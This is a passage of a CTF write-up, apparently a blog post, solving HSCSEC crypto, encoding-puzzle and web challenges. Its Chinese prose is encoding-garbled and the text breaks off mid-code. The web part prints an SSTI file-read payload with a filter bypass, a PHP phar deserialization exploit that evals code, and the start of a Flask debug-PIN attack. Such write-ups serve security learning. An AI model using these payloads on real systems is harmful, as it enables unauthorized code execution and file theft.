<code>flag2:aQR_c0de_and</code>ï¼›åè½¬çš„pngè¿˜åŸä¸ºæ–°pngå›¾ï¼Œåè‰²å¤„ç†å¾—åˆ° <code>HSCSEC&#123;p3G_h</code>ã€‚</p><p>å°‘äº†ç¬¬ä¸‰éƒ¨åˆ†ï¼Œå¯¹æ–°pngå›¾å°è¯•ä½¿ç”¨<a href="http://tools.jb51.net/aideddesign/img_add_info">PixelJihadè§£å¯†</a>ï¼Œå¾—åˆ° <code>_3nc&#125;</code>ã€‚</p><p>è¿æ¥ä¸ºflagï¼š<code>HSCSEC&#123;p3G_haQR_c0de_and_3nc&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h2><h3 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h3><blockquote><p>â˜²â˜µ â˜·â˜µâ˜³ â˜¶ç©º â˜·â˜µâ˜³ â˜¶â˜± â˜¶ç©º â˜·ç©ºâ˜± â˜¶ç©º â˜·â˜³â˜° â˜·â˜³â˜± â˜·â˜´â˜³ â˜·â˜³â˜³ â˜·â˜´â˜¶ â˜·â˜³â˜³ â˜·â˜·â˜° â˜·â˜³ç©º â˜°â˜´ â˜·â˜´â˜¶ â˜·â˜´â˜¶ â˜·â˜´ç©º â˜·ç©ºâ˜²</p></blockquote><p>çŒœæµ‹ä¸ºå…«å¦+ç©ºä¸€ä¸€å¯¹åº”9ä¸ªæ•°å­—ï¼Œæ ¹æ® <code>HSCSEC&#123;&#125;</code> å¯¹åº”çš„ä¹è¿›åˆ¶æ•°ï¼Œå¯çŸ¥7ä¸ªç¬¦å·å¯¹åº”çš„æ•°ï¼Œå‰©ä¸‹çš„2ä¸ªæµ‹è¯•å³å¯ã€‚</p><p>æœ€ç»ˆå¯¹åº” <code>80 102 74 102 76 74 146 74 125 126 132 122 137 122 115 124 53 137 137 134 148</code></p><p>è½¬æ¢ä¸ºåè¿›åˆ¶ï¼š<code>72 83 67 83 69 67 123 67 104 105 110 101 115 101 95 103 48 115 115 112 125</code></p><p>è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼š<code>HSCSEC&#123;Chinese_g0ssp&#125;</code>ï¼Œè¿˜å¾—æ‰‹åŠ¨è¡¥å…¨å•è¯æ‰æ­£ç¡®â€¦â€¦</p><p>flagï¼š<code>HSCSEC&#123;Chinese_g0ssip&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h3><blockquote><p>æ–—æœ¨ç¬è§’æœ¨è›Ÿå¥æœ¨ç‹¼äº¢é‡‘é¾™ ç‰›é‡‘ç‰›å¥³åœŸè æ°åœŸè²‰äº•æœ¨çŠ´<br>è™šæ—¥é¼ æˆ¿æ—¥å…”å¿ƒæœˆç‹é¬¼é‡‘ç¾Š å±æœˆç‡•å®¤ç«çŒªå°¾ç«è™æŸ³åœŸç<br>å£æ°´è²ç®•æ°´è±¹æ–—æœ¨ç¬ç‰›é‡‘ç‰› å¥³åœŸè è§’æœ¨è›Ÿäº¢é‡‘é¾™æ˜Ÿæ—¥é©¬<br>è™šæ—¥é¼ å¼ æœˆé¹¿å¨„é‡‘ç‹—ç¿¼ç«è›‡ å±æœˆç‡•æ°åœŸè²‰æˆ¿æ—¥å…”è½¸æ°´èš“<br>å®¤ç«çŒªå¿ƒæœˆç‹äº•æœ¨çŠ´èƒƒåœŸé›‰ å£æ°´è²æ–—æœ¨ç¬é¬¼é‡‘ç¾ŠæŸ³åœŸç<br>ç‰›é‡‘ç‰›å°¾ç«è™ç®•æ°´è±¹å¥³åœŸè  è™šæ—¥é¼ æ˜´æ—¥é¸¡æŸ³åœŸçæ¯•æœˆä¹Œ<br>å±æœˆç‡•è§œç«çŒ´è§’æœ¨è›Ÿæ˜Ÿæ—¥é©¬ å®¤ç«çŒªå‚æ°´çŒ¿å¥æœ¨ç‹¼å£æ°´è²<br>æ–—æœ¨ç¬å¨„é‡‘ç‹—ç‰›é‡‘ç‰›å¥³åœŸè  è™šæ—¥é¼ èƒƒåœŸé›‰å¼ æœˆé¹¿æ˜´æ—¥é¸¡<br>å±æœˆç‡•ç¿¼ç«è›‡å®¤ç«çŒªäº¢é‡‘é¾™ å£æ°´è²æ–—æœ¨ç¬è½¸æ°´èš“äº•æœ¨çŠ´<br>ç‰›é‡‘ç‰›æ°åœŸè²‰æˆ¿æ—¥å…”å¥³åœŸè  è™šæ—¥é¼ å±æœˆç‡•å¿ƒæœˆç‹å°¾ç«è™<br>å®¤ç«çŒªé¬¼é‡‘ç¾ŠæŸ³åœŸçå£æ°´è²</p></blockquote><p>æŸ¥åˆ°æ¯ä¸‰ä¸ªå­—ç»„æˆçš„è¯ä¸º28æ˜Ÿå®¿é‡Œçš„ä¸€ç§ï¼Œä¸”æ ¹æ®æ–¹ä½åˆ†åˆ«å½’ç±»åˆ°é’é¾™ã€ç™½è™ã€æœ±é›€ã€ç„æ­¦å››å¤§ç±»ä¸­ï¼š</p><p>é’é¾™ï¼šè§’æœ¨è›Ÿã€äº¢é‡‘é¾™ã€æ°åœŸè²‰ã€æˆ¿æ—¥å…”ã€å¿ƒæœˆç‹ã€å°¾ç«è™ã€ç®•æ°´è±¹<br>ç„æ­¦ï¼šæ–—æœ¨ç¬ã€ç‰›é‡‘ç‰›ã€å¥³åœŸè ã€è™šæ—¥é¼ ã€å±æœˆç‡•ã€å®¤ç«çŒªã€å£æ°´è²<br>ç™½è™ï¼šå¥æœ¨ç‹¼ã€å¨„é‡‘ç‹—ã€èƒƒåœŸé›‰ã€æ˜´æ—¥é¸¡ã€æ¯•æœˆä¹Œã€è§œç«çŒ´ã€å‚æ°´çŒ¿<br>æœ±é›€ï¼šäº•æœ¨çŠ´ã€é¬¼é‡‘ç¾Šã€æŸ³åœŸçã€æ˜Ÿæ—¥é©¬ã€å¼ æœˆé¹¿ã€ç¿¼ç«è›‡ã€è½¸æ°´èš“</p><p>æŒ‰4è¿›åˆ¶åˆ†åˆ«æ›¿æ¢ä¸º0-3ï¼Œå¾—åˆ° <code>1020 1103 1003 1103 1011 1003 1323 1003 1032 1133 1001 1232 1203 1221 1211 1232 1310 1133 1001 1100 1331</code>ã€‚</p><p>è½¬æ¢ä¸ºåè¿›åˆ¶ï¼š<code>72 83 67 83 69 67 123 67 78 95 65 110 99 105 101 110 116 95 65 80 125</code></p><p>è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼š<code>HSCSEC&#123;CN_Ancient_AP&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> m</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = m * e * <span class="number">1</span> * <span class="number">2022</span> * p</span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line"><span class="comment"># c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br></pre></td></tr></table></figure></blockquote><p>$c = M^e \bmod n = (2022mep)^e \bmod n$ï¼Œä»¤ $câ€™ = c \cdot (2022e)^{-e} \bmod n = (mp)^e \bmod n = (m^ep^{e-1} \bmod n) \cdot p$ï¼Œ</p><p>æ•… $\gcd(câ€™,n)=p$ï¼Œå†åˆ©ç”¨å¸¸è§„RSAæ±‚è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line">c = <span class="number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">cc = c * inverse_mod(<span class="built_in">pow</span>(<span class="number">2022</span>*e,e,n),n)</span><br><span class="line">p = gcd(cc,n)</span><br><span class="line">q = n // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(cc,d,n) // p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&quot;*******************MASK****************&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(FLAG)</span></span><br><span class="line">number1 = getPrime(<span class="number">512</span>)</span><br><span class="line">number2 = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(number1)</span><br><span class="line">result = FLAG * number1 % number2</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line"><span class="string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$m$ ä¸ $n_1$ ï¼ˆ512ä½ï¼‰ä¹˜ç§¯çš„å¤§å°ä¸ä¼šè¶…è¿‡ $n_2$ å¤§å°ï¼ˆ1024ä½ï¼‰ï¼Œæ•… $c=mn_1$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line">c = <span class="number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c//n1)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;qMmZqWvmj70bBsCfmVLT&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;HSC&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;HSCSEC&#123;&#x27;</span>)</span><br><span class="line">flag_num_list = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> flag:</span><br><span class="line">    flag_num_list.append(alphabet.find(item) + <span class="number">1</span>)</span><br><span class="line">key_num = alphabet.find(key) + <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_num_list:</span><br><span class="line">    m = (i + key_num) % <span class="number">94</span> - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> m == <span class="number">0</span>:</span><br><span class="line">        c.append(<span class="string">&quot;â–¡&quot;</span>)</span><br><span class="line">    c.append(alphabet[m-<span class="number">1</span>:m])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#x27;</span>.join(c)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span></span><br></pre></td></tr></table></figure></blockquote><p>ä»£ç é‡Œé¢çš„ <code>key_num</code> å…¶å®å›ºå®šä¸º0ï¼Œå®é™…å½“1ï¼Œæ¨¡è¿ç®—ä¹Ÿæ²¡å•¥ç”¨ï¼Œå®é™…æ˜¯rot1å‡¯æ’’åŠ å¯†ï¼Œè¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&#x27;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&#x27;</span></span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">flag = [alphabet[alphabet.index(k)+<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h3><p>åŸºæœ¬æ²¡è¿‡æ»¤çš„SSTIï¼Œå°è¯•</p><p> <code>?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open("/flag").read()&#125;&#125;</code></p><p>æŠ¥é”™æ— æ³•æ‰“å¼€ <code>/</code> ï¼Œè¯´æ˜ <code>flag</code> è¢«æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡å³å¯ï¼š</p><p><code>?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open("/flflagag").read()&#125;&#125;</code></p><p>â€‹    </p><h3 id="EASYPHY"><a href="#EASYPHY" class="headerlink" title="EASYPHY"></a>EASYPHY</h3><p>æŸ¥çœ‹é¦–é¡µæºç ï¼Œå‘ç°uploadå’Œviewä¸¤ä¸ªå¯¹è¯æ¡†åŒ…æ‹¬å…³é”®å­—æ®µ <code>name=&quot;acti0n&quot;</code>ï¼ŒæŠ“åŒ…çœ‹åˆ° <code>?acti0n=upload</code> çš„è®¿é—®æ–¹å¼ï¼Œä¸ºæ–‡ä»¶åŒ…å«æ¼æ´ç‚¹ã€‚</p><p>é€šè¿‡è®¾ç½® <code>acti0n</code> å‚æ•°å’Œfilterè¿‡æ»¤å™¨è®¿é—®ï¼Œå¾—åˆ° <code>upload.php</code> å’Œ <code>view.php</code> æºç ã€‚å®¡è®¡ä»£ç ï¼Œ<code>upload.php</code> ä¸­åŒ…å«ä¸Šä¼ æ–‡ä»¶ä¸æ‹¦æˆªè¿‡æ»¤å±é™©å‡½æ•°çš„åŠŸèƒ½ï¼Œ<code>view.php</code> ä¸­æœ‰ <code>eval()</code> å‡½æ•°ï¼Œåªéœ€è¦ä¿®æ”¹ç±»ä¸­çš„ç§æœ‰å˜é‡ <code>$cmd</code> å°±å¯ä»¥æ‹¿åˆ°shellã€‚</p><p>å…¶ä¸­ <code>file_exists()</code> å‡½æ•°ç»“åˆæ–‡ä»¶ä¸Šä¼ å¯ä»¥æƒ³åˆ°pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ã€‚ç»“åˆ <code>upload.php</code> ä¸­å…³é”®å­—é»‘åå•ï¼Œä½¿ç”¨ <code>show_source()</code> å‡½æ•°è¯»å– <code>flag.php</code> æ–‡ä»¶ã€‚</p><p>æ„é€ pharæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°è¿è¡Œç”Ÿæˆ <code>phar.phar</code>ï¼Œç„¶åç›´æ¥ä¸Šä¼ ã€‚æ–‡ä»¶ä¸Šä¼ æˆåŠŸä¹‹åï¼Œé€šè¿‡ <code>delete</code> è¿™ä¸ªå‚æ•°æ¥è§¦å‘ <code>file_exists()</code> æ‰å¯ä»¥åˆ©ç”¨pharï¼ŒPOSTå‚æ•° <code>delete=phar://phar.phar</code> å³å¯æ‹¿åˆ°flagã€‚</p><p>â€‹    </p><h3 id="EZSYFLASK"><a href="#EZSYFLASK" class="headerlink" title="EZSYFLASK"></a>EZSYFLASK</h3><p>æœ‰ä¸€ä¸ªå¯ä»¥æ–‡ä»¶åŒ…å«çš„è·¯ç”±ï¼š<code>GET /view?filename=app.py</code>ï¼Œå¾—åˆ°æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;GET /view?filename=app.py&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewFile</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;cgroup&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;self&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;æ–‡ä»¶å­˜åœ¨&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;</span></span><br><span class="line"><span class="string">            &#123;&#125;</span></span><br><span class="line"><span class="string">            &lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;æ–‡ä»¶ä¸å­˜åœ¨&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;</span></span><br><span class="line"><span class="string">        æ–‡ä»¶ä¸å­˜åœ¨</span></span><br><span class="line"><span class="string">        &lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å»é™¤å‚æ•°å¯ä»¥è§¦å‘debugæŠ¥é”™é¡µï¼Œè®¡ç®—PINå€¼å¯ä»¥è¿›å…¥è°ƒè¯•æ¨¡å¼ã€‚ç”±äºç¦ç”¨äº† <code>flag/self/cgroup</code>ï¼Œ<code>/proc/self/cgroup</code> è·å–ä¸åˆ°ï¼Œå¯ä»¥åˆ©ç”¨ <code>/proc/1/mountinfo</code> è·å–docker-idï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 